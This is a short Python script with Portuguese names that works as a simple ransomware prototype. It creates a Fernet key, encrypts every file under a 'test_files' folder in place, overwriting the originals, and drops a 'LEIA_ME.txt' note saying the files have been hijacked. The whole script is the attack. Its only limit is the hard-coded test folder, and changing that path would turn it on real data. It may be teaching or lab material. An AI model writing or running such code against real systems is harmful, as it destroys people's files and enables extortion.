from cryptography.fernet import Fernet
import os

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

def carregar_chave():
    return open("chave.key", "rb").read()

def criptografar_arquivo(caminho_arquivo, chave):
    f = Fernet(chave)
    with open(caminho_arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(caminho_arquivo, "wb") as file:
        file.write(dados_encriptados)

def main():
    if not os.path.exists("chave.key"):
        gerar_chave()
    
    chave = carregar_chave()
    diretorio = "test_files"
    
    if not os.path.exists(diretorio):
        os.makedirs(diretorio)
    
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            print(f"Criptografando: {caminho}")
            criptografar_arquivo(caminho, chave)
    
    with open(os.path.join(diretorio, "LEIA_ME.txt"), "w") as f:
        f.write("SEUS ARQUIVOS FORAM SEQUESTRADOS!")

if __name__ == "__main__":
    main()
